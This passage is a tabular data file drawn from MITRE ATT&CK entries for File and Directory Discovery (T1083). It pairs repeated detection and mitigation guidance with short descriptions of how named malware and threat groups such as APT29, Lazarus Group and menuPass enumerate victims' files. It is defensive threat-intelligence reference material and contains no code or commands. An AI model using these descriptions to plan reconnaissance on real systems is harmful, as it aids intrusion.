Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']","['User', 'Administrator', 'SYSTEM']","['Some folders may require Administrator, SYSTEM or specific user depending on permission levels and access controls']",Software: SOUNDBITE,['Discovery'],['Technique/T1083'],['File and Directory Discovery'],https://attack.mitre.org/wiki/Technique/T1083
155,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Collection]] and [[Exfiltration]], based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],[],[],"['File monitoring', 'Process command-line parameters', 'Process monitoring']","['[[Software/S0093|Backdoor.Oldrea]] collects information about available drives, default browser, desktop file list, My Documents, Internet history, program files, and root of available drives. It also searches for ICS-related software files.[[CiteRef::Symantec Dragonfly]]']",['Dragonfly'],"['Dragonfly', 'Energetic Bear']",['G0035'],"['File system activity is a common part of an operating system, so it is unlikely that mitigation would be appropriate for this technique. It may still be beneficial to identify and block unnecessary system utilities or potentially malicious software by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']","['User', 'Administrator', 'SYSTEM']","['Some folders may require Administrator, SYSTEM or specific user depending on permission levels and access controls']","Software: Backdoor.Oldrea, Havex",['Discovery'],['Technique/T1083'],['File and Directory Discovery'],https://attack.mitre.org/wiki/Technique/T1083
156,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Collection]] and [[Exfiltration]], based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],[],[],"['File monitoring', 'Process command-line parameters', 'Process monitoring']","['[[Software/S0083|Misdat]] is capable of running commands to obtain a list of files and directories, as well as enumerating logical drives.[[CiteRef::Cylance Dust Storm]]']",['Dust Storm'],['Dust Storm'],['G0031'],"['File system activity is a common part of an operating system, so it is unlikely that mitigation would be appropriate for this technique. It may still be beneficial to identify and block unnecessary system utilities or potentially malicious software by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']","['User', 'Administrator', 'SYSTEM']","['Some folders may require Administrator, SYSTEM or specific user depending on permission levels and access controls']",Software: Misdat,['Discovery'],['Technique/T1083'],['File and Directory Discovery'],https://attack.mitre.org/wiki/Technique/T1083
157,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Collection]] and [[Exfiltration]], based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],[],[],"['File monitoring', 'Process command-line parameters', 'Process monitoring']",['[[Software/S0086|ZLib]] has the ability to enumerate files and drives.[[CiteRef::Cylance Dust Storm]]'],['Dust Storm'],['Dust Storm'],['G0031'],"['File system activity is a common part of an operating system, so it is unlikely that mitigation would be appropriate for this technique. It may still be beneficial to identify and block unnecessary system utilities or potentially malicious software by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']","['User', 'Administrator', 'SYSTEM']","['Some folders may require Administrator, SYSTEM or specific user depending on permission levels and access controls']",Software: ZLib,['Discovery'],['Technique/T1083'],['File and Directory Discovery'],https://attack.mitre.org/wiki/Technique/T1083
158,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Collection]] and [[Exfiltration]], based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],[],[],"['File monitoring', 'Process command-line parameters', 'Process monitoring']",['[[Group/G0031|Dust Storm]] has used Android backdoors capable of enumerating specific files on the infected devices.[[CiteRef::Cylance Dust Storm]]'],['Dust Storm'],['Dust Storm'],['G0031'],"['File system activity is a common part of an operating system, so it is unlikely that mitigation would be appropriate for this technique. It may still be beneficial to identify and block unnecessary system utilities or potentially malicious software by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']","['User', 'Administrator', 'SYSTEM']","['Some folders may require Administrator, SYSTEM or specific user depending on permission levels and access controls']",[],['Discovery'],['Technique/T1083'],['File and Directory Discovery'],https://attack.mitre.org/wiki/Technique/T1083
159,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Collection]] and [[Exfiltration]], based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],[],[],"['File monitoring', 'Process command-line parameters', 'Process monitoring']",['[[Software/S0048|PinchDuke]] searches for files created within a certain timeframe and whose file extension matches a predefined list.[[CiteRef::F-Secure The Dukes]]'],['APT29'],"['APT29', 'The Dukes', 'Cozy Bear']",['G0016'],"['File system activity is a common part of an operating system, so it is unlikely that mitigation would be appropriate for this technique. It may still be beneficial to identify and block unnecessary system utilities or potentially malicious software by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']","['User', 'Administrator', 'SYSTEM']","['Some folders may require Administrator, SYSTEM or specific user depending on permission levels and access controls']",Software: PinchDuke,['Discovery'],['Technique/T1083'],['File and Directory Discovery'],https://attack.mitre.org/wiki/Technique/T1083
160,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Collection]] and [[Exfiltration]], based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],[],[],"['File monitoring', 'Process command-line parameters', 'Process monitoring']",['[[Software/S0050|CosmicDuke]] searches attached and mounted drives for file extensions and keywords that match a predefined list.[[CiteRef::F-Secure Cosmicduke]]'],['APT29'],"['APT29', 'The Dukes', 'Cozy Bear']",['G0016'],"['File system activity is a common part of an operating system, so it is unlikely that mitigation would be appropriate for this technique. It may still be beneficial to identify and block unnecessary system utilities or potentially malicious software by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']","['User', 'Administrator', 'SYSTEM']","['Some folders may require Administrator, SYSTEM or specific user depending on permission levels and access controls']","Software: CosmicDuke, TinyBaron, ...",['Discovery'],['Technique/T1083'],['File and Directory Discovery'],https://attack.mitre.org/wiki/Technique/T1083
161,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Collection]] and [[Exfiltration]], based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],[],[],"['File monitoring', 'Process command-line parameters', 'Process monitoring']","[""[[Software/S0049|GeminiDuke]] collects information from the victim, including installed drivers, programs previously executed by users, programs and services configured to automatically run at startup, files and folders present in any user's home folder, files and folders present in any user's My Documents, programs installed to the Program Files folder, and recently accessed files, folders, and programs.[[CiteRef::F-Secure The Dukes]]""]",['APT29'],"['APT29', 'The Dukes', 'Cozy Bear']",['G0016'],"['File system activity is a common part of an operating system, so it is unlikely that mitigation would be appropriate for this technique. It may still be beneficial to identify and block unnecessary system utilities or potentially malicious software by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']","['User', 'Administrator', 'SYSTEM']","['Some folders may require Administrator, SYSTEM or specific user depending on permission levels and access controls']",Software: GeminiDuke,['Discovery'],['Technique/T1083'],['File and Directory Discovery'],https://attack.mitre.org/wiki/Technique/T1083
162,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Collection]] and [[Exfiltration]], based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],[],[],"['File monitoring', 'Process command-line parameters', 'Process monitoring']",['[[Software/S0139|PowerDuke]] has commands to get its current directory name as well as the size of a file.[[CiteRef::Volexity PowerDuke November 2016]]'],['APT29'],"['APT29', 'The Dukes', 'Cozy Bear']",['G0016'],"['File system activity is a common part of an operating system, so it is unlikely that mitigation would be appropriate for this technique. It may still be beneficial to identify and block unnecessary system utilities or potentially malicious software by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']","['User', 'Administrator', 'SYSTEM']","['Some folders may require Administrator, SYSTEM or specific user depending on permission levels and access controls']",Software: PowerDuke,['Discovery'],['Technique/T1083'],['File and Directory Discovery'],https://attack.mitre.org/wiki/Technique/T1083
163,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Collection]] and [[Exfiltration]], based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],[],[],"['File monitoring', 'Process command-line parameters', 'Process monitoring']",['Several [[Group/G0032|Lazarus Group]] malware samples use a common function to identify target files by their extension. [[Group/G0032|Lazarus Group]] malware families also enumerate files and directories on lettered drives.[[CiteRef::Novetta Blockbuster]]'],['Lazarus Group'],"['Lazarus Group', 'HIDDEN COBRA', 'Guardians of Peace']",['G0032'],"['File system activity is a common part of an operating system, so it is unlikely that mitigation would be appropriate for this technique. It may still be beneficial to identify and block unnecessary system utilities or potentially malicious software by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']","['User', 'Administrator', 'SYSTEM']","['Some folders may require Administrator, SYSTEM or specific user depending on permission levels and access controls']",[],['Discovery'],['Technique/T1083'],['File and Directory Discovery'],https://attack.mitre.org/wiki/Technique/T1083
164,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Collection]] and [[Exfiltration]], based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],[],[],"['File monitoring', 'Process command-line parameters', 'Process monitoring']",['[[Software/S0063|SHOTPUT]] has a command to obtain a directory listing.[[CiteRef::Palo Alto CVE-2015-3113 July 2015]]'],['APT3'],"['APT3', 'Gothic Panda', 'Pirpi', 'UPS Team', 'Buckeye', 'Threat Group-0110', 'TG-0110']",['G0022'],"['File system activity is a common part of an operating system, so it is unlikely that mitigation would be appropriate for this technique. It may still be beneficial to identify and block unnecessary system utilities or potentially malicious software by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']","['User', 'Administrator', 'SYSTEM']","['Some folders may require Administrator, SYSTEM or specific user depending on permission levels and access controls']","Software: SHOTPUT, Backdoor.APT.CookieCutter, Pirpi",['Discovery'],['Technique/T1083'],['File and Directory Discovery'],https://attack.mitre.org/wiki/Technique/T1083
165,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Collection]] and [[Exfiltration]], based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],[],[],"['File monitoring', 'Process command-line parameters', 'Process monitoring']",['[[Software/S0064|ELMER]] is capable of performing directory listings.[[CiteRef::FireEye EPS Awakens Part 2]]'],['APT16'],['APT16'],['G0023'],"['File system activity is a common part of an operating system, so it is unlikely that mitigation would be appropriate for this technique. It may still be beneficial to identify and block unnecessary system utilities or potentially malicious software by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']","['User', 'Administrator', 'SYSTEM']","['Some folders may require Administrator, SYSTEM or specific user depending on permission levels and access controls']",Software: ELMER,['Discovery'],['Technique/T1083'],['File and Directory Discovery'],https://attack.mitre.org/wiki/Technique/T1083
166,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Collection]] and [[Exfiltration]], based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],[],[],"['File monitoring', 'Process command-line parameters', 'Process monitoring']",['[[Software/S0144|ChChes]] identifies the file path for the %TEMP% director and sets its current working directory to that path.[[CiteRef::Palo Alto menuPass Feb 2017]]'],['menuPass'],"['menuPass', 'Stone Panda', 'APT10', 'Red Apollo', 'CVNX']",['G0045'],"['File system activity is a common part of an operating system, so it is unlikely that mitigation would be appropriate for this technique. It may still be beneficial to identify and block unnecessary system utilities or potentially malicious software by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']","['User', 'Administrator', 'SYSTEM']","['Some folders may require Administrator, SYSTEM or specific user depending on permission levels and access controls']","Software: ChChes, Scorpion, HAYMAKER",['Discovery'],['Technique/T1083'],['File and Directory Discovery'],https://attack.mitre.org/wiki/Technique/T1083
167,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Collection]] and [[Exfiltration]], based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],[],[],"['File monitoring', 'Process command-line parameters', 'Process monitoring']","[""[[Software/S0144|ChChes]] collects the victim's %TEMP% directory path and version of Internet Explorer.[[CiteRef::FireEye APT10 April 2017]]""]",['menuPass'],"['menuPass', 'Stone Panda', 'APT10', 'Red Apollo', 'CVNX']",['G0045'],"['File system activity is a common part of an operating system, so it is unlikely that mitigation would be appropriate for this technique. It may still be beneficial to identify and block unnecessary system utilities or potentially malicious software by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']","['User', 'Administrator', 'SYSTEM']","['Some folders may require Administrator, SYSTEM or specific user depending on permission levels and access controls']","Software: ChChes, Scorpion, HAYMAKER",['Discovery'],['Technique/T1083'],['File and Directory Discovery'],https://attack.mitre.org/wiki/Technique/T1083
168,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Collection]] and [[Exfiltration]], based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],[],[],"['File monitoring', 'Process command-line parameters', 'Process monitoring']",['[[Software/S0153|RedLeaves]] can enumerate and search for files and directories.[[CiteRef::PWC Cloud Hopper Technical Annex April 2017]][[CiteRef::FireEye APT10 April 2017]]'],['menuPass'],"['menuPass', 'Stone Panda', 'APT10', 'Red Apollo', 'CVNX']",['G0045'],"['File system activity is a common part of an operating system, so it is unlikely that mitigation would be appropriate for this technique. It may still be beneficial to identify and block unnecessary system utilities or potentially malicious software by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']","['User', 'Administrator', 'SYSTEM']","['Some folders may require Administrator, SYSTEM or specific user depending on permission levels and access controls']","Software: RedLeaves, BUGJUICE",['Discovery'],['Technique/T1083'],['File and Directory Discovery'],https://attack.mitre.org/wiki/Technique/T1083
169,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Collection]] and [[Exfiltration]], based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],[],[],"['File monitoring', 'Process command-line parameters', 'Process monitoring']",['[[Software/S0106|cmd]] can be used to find files and directories with native functionality such as <code>dir</code> commands.[[CiteRef::TechNet Dir]]'],['menuPass'],"['menuPass', 'Stone Panda', 'APT10', 'Red Apollo', 'CVNX']",['G0045'],"['File system activity is a common part of an operating system, so it is unlikely that mitigation would be appropriate for this technique. It may still be beneficial to identify and block unnecessary system utilities or potentially malicious software by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']","['User', 'Administrator', 'SYSTEM']","['Some folders may require Administrator, SYSTEM or specific user depending on permission levels and access controls']","Software: cmd, cmd.exe",['Discovery'],['Technique/T1083'],['File and Directory Discovery'],https://attack.mitre.org/wiki/Technique/T1083
170,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Collection]] and [[Exfiltration]], based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],[],[],"['File monitoring', 'Process command-line parameters', 'Process monitoring']",['[[Software/S0062|DustySky]] scans the victim for files that contain certain keywords from a list that is obtained from the C2 as a text file. It also collects information about installed software.[[CiteRef::DustySky]]'],['Molerats'],"['Molerats', 'Gaza cybergang', 'Operation Molerats']",['G0021'],"['File system activity is a common part of an operating system, so it is unlikely that mitigation would be appropriate for this technique. It may still be beneficial to identify and block unnecessary system utilities or potentially malicious software by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']","['User', 'Administrator', 'SYSTEM']","['Some folders may require Administrator, SYSTEM or specific user depending on permission levels and access controls']","Software: DustySky, NeD Worm",['Discovery'],['Technique/T1083'],['File and Directory Discovery'],https://attack.mitre.org/wiki/Technique/T1083
171,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Collection]] and [[Exfiltration]], based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],[],[],"['File monitoring', 'Process command-line parameters', 'Process monitoring']",['A [[Group/G0040|Patchwork]] payload has searched all fixed drives on the victim for files matching a specified list of extensions.[[CiteRef::Cymmetria Patchwork]]'],['Patchwork'],"['Patchwork', 'Dropping Elephant', 'Chinastrats']",['G0040'],"['File system activity is a common part of an operating system, so it is unlikely that mitigation would be appropriate for this technique. It may still be beneficial to identify and block unnecessary system utilities or potentially malicious software by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']","['User', 'Administrator', 'SYSTEM']","['Some folders may require Administrator, SYSTEM or specific user depending on permission levels and access controls']",[],['Discovery'],['Technique/T1083'],['File and Directory Discovery'],https://attack.mitre.org/wiki/Technique/T1083
172,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Collection]] and [[Exfiltration]], based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],[],[],"['File monitoring', 'Process command-line parameters', 'Process monitoring']","['[[Software/S0070|HTTPBrowser]] is capable of listing files, folders, and drives on a victim.[[CiteRef::Dell TG-3390]][[CiteRef::ZScaler Hacking Team]]']",['Threat Group-3390'],"['Threat Group-3390', 'TG-3390', 'Emissary Panda', 'BRONZE UNION']",['G0027'],"['File system activity is a common part of an operating system, so it is unlikely that mitigation would be appropriate for this technique. It may still be beneficial to identify and block unnecessary system utilities or potentially malicious software by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 